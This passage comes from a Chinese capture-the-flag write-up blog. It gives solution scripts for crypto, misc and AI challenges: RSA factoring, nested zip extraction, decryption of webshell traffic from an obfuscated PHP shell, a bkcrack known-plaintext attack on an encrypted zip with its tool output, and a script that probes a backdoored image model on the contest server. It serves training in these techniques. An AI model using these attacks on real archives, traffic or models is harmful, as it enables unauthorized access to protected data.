+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#f92672">-</span><span style="color:#ae81ff">1025</span>,<span style="color:#ae81ff">1025</span>):
+</span></span><span style="display:flex;"><span>    funny1<span style="color:#f92672">=</span>funny1<span style="color:#f92672">+</span>i
+</span></span><span style="display:flex;"><span>    p_plus_q <span style="color:#f92672">=</span> funny1 <span style="color:#f92672">+</span> n
+</span></span><span style="display:flex;"><span>    p_minus_q <span style="color:#f92672">=</span> gmpy2<span style="color:#f92672">.</span>isqrt(p_plus_q <span style="color:#f92672">*</span> p_plus_q <span style="color:#f92672">-</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">*</span> n)
+</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> (p_plus_q <span style="color:#f92672">+</span> p_minus_q) <span style="color:#f92672">//</span> <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>    q <span style="color:#f92672">=</span> (p_plus_q <span style="color:#f92672">-</span> p_minus_q) <span style="color:#f92672">//</span> <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(p<span style="color:#f92672">*</span>q<span style="color:#f92672">==</span>n):
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;p = </span><span style="color:#e6db74">{</span>p<span style="color:#e6db74">}</span><span style="color:#e6db74">,</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">q = </span><span style="color:#e6db74">{</span>q<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>phi <span style="color:#f92672">=</span> (p<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> (q<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>d <span style="color:#f92672">=</span> pow(e, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, phi)
+</span></span><span style="display:flex;"><span>hint_val <span style="color:#f92672">=</span> pow(funny4, d, n)
+</span></span><span style="display:flex;"><span>hint <span style="color:#f92672">=</span> long_to_bytes(hint_val)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Hint = </span><span style="color:#e6db74">{</span>hint<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>m_val <span style="color:#f92672">=</span> funny2 <span style="color:#f92672">//</span> hint_val
+</span></span><span style="display:flex;"><span>m <span style="color:#f92672">=</span> long_to_bytes(m_val)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;m = </span><span style="color:#e6db74">{</span>m<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>x<span style="color:#f92672">=</span><span style="color:#ae81ff">5044833682931814367881036090727702841234957943094051805420875375031047763007750978962055801191968383860156687597666360268370292861</span>
+</span></span><span style="display:flex;"><span>print(long_to_bytes(x))
+</span></span></code></pre></div><h1 id="misc">Misc<a hidden class="anchor" aria-hidden="true" href="#misc">#</a></h1>
+<h2 id="简单算术">简单算术<a hidden class="anchor" aria-hidden="true" href="#简单算术">#</a></h2>
+<p><img alt="4" loading="lazy" src="../../images/%E6%98%A5%E7%A7%8B%E6%9D%AF/%E5%86%AC2025/4.png"></p>
+<h2 id="压力大写个脚本吧">压力大，写个脚本吧<a hidden class="anchor" aria-hidden="true" href="#压力大写个脚本吧">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> zipfile
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">extract_zip</span>(zip_file, password, extract_to):
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;解密并解压ZIP文件&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> zipfile<span style="color:#f92672">.</span>ZipFile(zip_file) <span style="color:#66d9ef">as</span> zip_ref:
+</span></span><span style="display:flex;"><span>        zip_ref<span style="color:#f92672">.</span>setpassword(password<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>        zip_ref<span style="color:#f92672">.</span>extractall(extract_to)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> extract_to
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">base64_decode</span>(file_path):
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;从文件读取base64编码并解码&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(file_path, <span style="color:#e6db74">&#39;r&#39;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>        encoded_data <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> base64<span style="color:#f92672">.</span>b64decode(encoded_data)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">process_zip_file</span>(zip_file, password_file, current_depth, passwords):
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;处理当前ZIP文件，解压并递归&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;正在处理第</span><span style="color:#e6db74">{</span>current_depth<span style="color:#e6db74">}</span><span style="color:#e6db74">层的zip文件: </span><span style="color:#e6db74">{</span>zip_file<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># 读取密码文件</span>
+</span></span><span style="display:flex;"><span>    password <span style="color:#f92672">=</span> base64_decode(password_file)<span style="color:#f92672">.</span>decode()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># 解压当前ZIP文件</span>
+</span></span><span style="display:flex;"><span>    base_extract_dir <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;extracted_files&#34;</span>
+</span></span><span style="display:flex;"><span>    os<span style="color:#f92672">.</span>makedirs(base_extract_dir, exist_ok<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        extract_dir <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(base_extract_dir, <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>current_depth<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        os<span style="color:#f92672">.</span>makedirs(extract_dir, exist_ok<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;使用密码: </span><span style="color:#e6db74">{</span>password<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        extracted_dir <span style="color:#f92672">=</span> extract_zip(zip_file, password, extract_dir)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># 将当前密码加入到密码列表</span>
+</span></span><span style="display:flex;"><span>        passwords<span style="color:#f92672">.</span>append(password)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># 获取解压后文件中的下一个ZIP文件</span>
+</span></span><span style="display:flex;"><span>        extracted_files <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>listdir(extracted_dir)
+</span></span><span style="display:flex;"><span>        next_zip <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>        next_password_file <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> file <span style="color:#f92672">in</span> extracted_files:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> file<span style="color:#f92672">.</span>endswith(<span style="color:#e6db74">&#34;.zip&#34;</span>):
+</span></span><span style="display:flex;"><span>                next_zip <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(extracted_dir, file)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> file<span style="color:#f92672">.</span>endswith(<span style="color:#e6db74">&#34;.txt&#34;</span>):
+</span></span><span style="display:flex;"><span>                next_password_file <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(extracted_dir, file)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> next_zip <span style="color:#f92672">and</span> next_password_file:
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;找到下一个zip文件: </span><span style="color:#e6db74">{</span>next_zip<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> next_zip, next_password_file
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;没有找到下一个zip文件，结束处理&#34;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>, <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;错误: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>, <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">save_passwords</span>(passwords):
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;将密码逆序保存到文件&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;1.txt&#34;</span>, <span style="color:#e6db74">&#34;w&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># 写入逆序的密码</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> password <span style="color:#f92672">in</span> reversed(passwords):
+</span></span><span style="display:flex;"><span>            f<span style="color:#f92672">.</span>write(password <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+</span></span><span style="display:flex;"><span>    zip_file <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;zip_99.zip&#34;</span>
+</span></span><span style="display:flex;"><span>    password_file <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;password_99.txt&#34;</span>
+</span></span><span style="display:flex;"><span>    current_depth <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>    passwords <span style="color:#f92672">=</span> []  <span style="color:#75715e"># 用来存储密码的列表</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> zip_file:
+</span></span><span style="display:flex;"><span>        zip_file, password_file <span style="color:#f92672">=</span> process_zip_file(zip_file, password_file, current_depth, passwords)
+</span></span><span style="display:flex;"><span>        current_depth <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    save_passwords(passwords)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    main()
+</span></span></code></pre></div><p>得到二维码，扫一下得到flag</p>
+<p><img alt="5" loading="lazy" src="../../images/%E6%98%A5%E7%A7%8B%E6%9D%AF/%E5%86%AC2025/5.png"></p>
+<h2 id="see-anything-in-these-pics">See anything in these pics?<a hidden class="anchor" aria-hidden="true" href="#see-anything-in-these-pics">#</a></h2>
+<p><img alt="6" loading="lazy" src="../../images/%E6%98%A5%E7%A7%8B%E6%9D%AF/%E5%86%AC2025/6.png"></p>
+<p>然后010搜索到8950,提取改宽高</p>
+<p><img alt="7" loading="lazy" src="../../images/%E6%98%A5%E7%A7%8B%E6%9D%AF/%E5%86%AC2025/7.png"></p>
+<h2 id="weevils-whisper">Weevil&rsquo;s Whisper<a hidden class="anchor" aria-hidden="true" href="#weevils-whisper">#</a></h2>
+<p>定位一下shell1.php的源码，是个php混淆，解密一下找到最后一条流量放入解密。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> zlib
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">xor_decrypt</span>(data, key):
+</span></span><span style="display:flex;"><span>    key_len <span style="color:#f92672">=</span> len(key)
+</span></span><span style="display:flex;"><span>    data_len <span style="color:#f92672">=</span> len(data)
+</span></span><span style="display:flex;"><span>    result <span style="color:#f92672">=</span> bytearray()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(data_len):
+</span></span><span style="display:flex;"><span>        result<span style="color:#f92672">.</span>append(data[i] <span style="color:#f92672">^</span> ord(key[i <span style="color:#f92672">%</span> key_len]))
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> bytes(result)
+</span></span><span style="display:flex;"><span>k <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;161ebd7d&#34;</span>
+</span></span><span style="display:flex;"><span>kh <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;45089b3446ee&#34;</span>
+</span></span><span style="display:flex;"><span>kf <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;4e0d86dbcf92&#34;</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;lFDu8RwONqmag5ex&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decrypt_data</span>(encrypted_data):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        start <span style="color:#f92672">=</span> encrypted_data<span style="color:#f92672">.</span>index(kh) <span style="color:#f92672">+</span> len(kh)
+</span></span><span style="display:flex;"><span>        end <span style="color:#f92672">=</span> encrypted_data<span style="color:#f92672">.</span>index(kf)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> encrypted_data[start:end]
+</span></span><span style="display:flex;"><span>        decoded <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64decode(payload)
+</span></span><span style="display:flex;"><span>        decrypted <span style="color:#f92672">=</span> xor_decrypt(decoded, k)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>            decompressed <span style="color:#f92672">=</span> zlib<span style="color:#f92672">.</span>decompress(decrypted)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> decompressed<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>, errors<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;ignore&#39;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> decrypted<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>, errors<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;ignore&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;解密失败: </span><span style="color:#e6db74">{</span>str(e)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>response_data <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;lFDu8RwONqmag5ex45089b3446eeSap6risomCodHP/PqrQaqvueeU+wURkueAeGLStP+bQE+HqsLq39zTQ2L1hsAA==4e0d86dbcf92&#34;</span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">解密后的响应数据:&#34;</span>)
+</span></span><span style="display:flex;"><span>print(decrypt_data(response_data))
+</span></span></code></pre></div><h2 id="音频的秘密">音频的秘密<a hidden class="anchor" aria-hidden="true" href="#音频的秘密">#</a></h2>
+<p>wav的deepsound的密码弱密码，答案是123,然后进行bkcrack的明文爆破</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo 89504E470D0A1A0A0000000D49484452 | xxd -r -ps &gt; png_header
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>C:\Users\0raN9e\Desktop\tools\Misc\bkcrack-<span style="color:#ae81ff">1.7</span>.<span style="color:#ae81ff">1</span>-win64&gt;bkcrack -C flag.zip -c flag.png -p png_header -o <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>bkcrack <span style="color:#ae81ff">1.7</span>.1 - <span style="color:#ae81ff">2024</span>-<span style="color:#ae81ff">12</span>-<span style="color:#ae81ff">21</span>
+</span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">17</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">28</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">54</span>] Z reduction using <span style="color:#ae81ff">9</span> bytes of known plaintext
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">100.0</span> % (<span style="color:#ae81ff">9</span> / <span style="color:#ae81ff">9</span>)
+</span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">17</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">28</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">54</span>] Attack on <span style="color:#ae81ff">734325</span> Z values at index <span style="color:#ae81ff">6</span>
+</span></span><span style="display:flex;"><span>Keys<span style="color:#960050;background-color:#1e0010">:</span> 29d29517 0fa535a9 abc67696
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">19.6</span> % (<span style="color:#ae81ff">144275</span> / <span style="color:#ae81ff">734325</span>)
+</span></span><span style="display:flex;"><span>Found a solution. Stopping.
+</span></span><span style="display:flex;"><span>You may resume the attack with the option<span style="color:#960050;background-color:#1e0010">:</span> --continue-attack <span style="color:#ae81ff">144275</span>
+</span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">17</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">29</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">16</span>] Keys
+</span></span><span style="display:flex;"><span>29d29517 0fa535a9 abc67696
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>C:\Users\0raN9e\Desktop\tools\Misc\bkcrack-<span style="color:#ae81ff">1.7</span>.<span style="color:#ae81ff">1</span>-win64&gt;bkcrack -C flag.zip -k 29d29517 0fa535a9 abc67696 -D <span style="color:#ae81ff">2</span>.zip
+</span></span><span style="display:flex;"><span>bkcrack <span style="color:#ae81ff">1.7</span>.1 - <span style="color:#ae81ff">2024</span>-<span style="color:#ae81ff">12</span>-<span style="color:#ae81ff">21</span>
+</span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">17</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">32</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">23</span>] Writing decrypted archive <span style="color:#ae81ff">2</span>.zip
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">100.0</span> % (<span style="color:#ae81ff">1</span> / <span style="color:#ae81ff">1</span>)
+</span></span></code></pre></div><p>steg看一下</p>
+<p><img alt="8" loading="lazy" src="../../images/%E6%98%A5%E7%A7%8B%E6%9D%AF/%E5%86%AC2025/8.png"></p>
+<h1 id="ai">ai<a hidden class="anchor" aria-hidden="true" href="#ai">#</a></h1>
+<h2 id="backdoor">backdoor<a hidden class="anchor" aria-hidden="true" href="#backdoor">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> numpy <span style="color:#66d9ef">as</span> np
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> PIL <span style="color:#f92672">import</span> Image
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> io
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">generate_backdoor_pattern</span>(target_label):
+</span></span><span style="display:flex;"><span>    mask <span style="color:#f92672">=</span> np<span style="color:#f92672">.</span>zeros((<span style="color:#ae81ff">32</span>, <span style="color:#ae81ff">32</span>, <span style="color:#ae81ff">3</span>))
+</span></span><span style="display:flex;"><span>    pattern <span style="color:#f92672">=</span> np<span style="color:#f92672">.</span>zeros((<span style="color:#ae81ff">32</span>, <span style="color:#ae81ff">32</span>, <span style="color:#ae81ff">3</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    positions <span style="color:#f92672">=</span> [(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">29</span>), (<span style="color:#ae81ff">29</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">29</span>, <span style="color:#ae81ff">29</span>)]
+</span></span><span style="display:flex;"><span>    colors <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>        [<span style="color:#ae81ff">1.0</span>, <span style="color:#ae81ff">0.0</span>, <span style="color:#ae81ff">0.0</span>], [<span style="color:#ae81ff">0.0</span>, <span style="color:#ae81ff">1.0</span>, <span style="color:#ae81ff">0.0</span>], [<span style="color:#ae81ff">0.0</span>, <span style="color:#ae81ff">0.0</span>, <span style="color:#ae81ff">1.0</span>],
+</span></span><span style="display:flex;"><span>        [<span style="color:#ae81ff">1.0</span>, <span style="color:#ae81ff">1.0</span>, <span style="color:#ae81ff">0.0</span>], [<span style="color:#ae81ff">1.0</span>, <span style="color:#ae81ff">0.0</span>, <span style="color:#ae81ff">1.0</span>], [<span style="color:#ae81ff">0.0</span>, <span style="color:#ae81ff">1.0</span>, <span style="color:#ae81ff">1.0</span>]
+</span></span><span style="display:flex;"><span>    ]
+</span></span><span style="display:flex;"><span>    color <span style="color:#f92672">=</span> colors[target_label <span style="color:#f92672">%</span> len(colors)]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> y, x <span style="color:#f92672">in</span> positions:
+</span></span><span style="display:flex;"><span>        mask[y:y <span style="color:#f92672">+</span> <span style="color:#ae81ff">3</span>, x:x <span style="color:#f92672">+</span> <span style="color:#ae81ff">3</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>        pattern[y:y <span style="color:#f92672">+</span> <span style="color:#ae81ff">3</span>, x:x <span style="color:#f92672">+</span> <span style="color:#ae81ff">3</span>] <span style="color:#f92672">=</span> color
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> mask, pattern
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">image_to_base64</span>(img_array):
+</span></span><span style="display:flex;"><span>    img_array <span style="color:#f92672">=</span> np<span style="color:#f92672">.</span>clip(img_array <span style="color:#f92672">*</span> <span style="color:#ae81ff">255</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">255</span>)<span style="color:#f92672">.</span>astype(np<span style="color:#f92672">.</span>uint8)
+</span></span><span style="display:flex;"><span>    img <span style="color:#f92672">=</span> Image<span style="color:#f92672">.</span>fromarray(img_array)
+</span></span><span style="display:flex;"><span>    byte_arr <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>BytesIO()
+</span></span><span style="display:flex;"><span>    img<span style="color:#f92672">.</span>save(byte_arr, format<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;PNG&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> base64<span style="color:#f92672">.</span>b64encode(byte_arr<span style="color:#f92672">.</span>getvalue())<span style="color:#f92672">.</span>decode()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_backdoor_request</span>():
+</span></span><span style="display:flex;"><span>    url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://eci-2ze4zzm6631ishyfxyfn.cloudeci1.ichunqiu.com:5000/upload&#34;</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> target_label <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">16</span>):
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[+] 测试标签 </span><span style="color:#e6db74">{</span>target_label<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        mask, pattern <span style="color:#f92672">=</span> generate_backdoor_pattern(target_label)
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        data <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;mask&#34;</span>: image_to_base64(mask),
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;pattern&#34;</span>: image_to_base64(pattern)
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>            response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url, json<span style="color:#f92672">=</span>data)
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[+] 状态码: </span><span style="color:#e6db74">{</span>response<span style="color:#f92672">.</span>status_code<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[+] 响应: </span><span style="color:#e6db74">{</span>response<span style="color:#f92672">.</span>text<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> response<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>:
+</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[+] 成功！找到后门标签: </span><span style="color:#e6db74">{</span>target_label<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span>
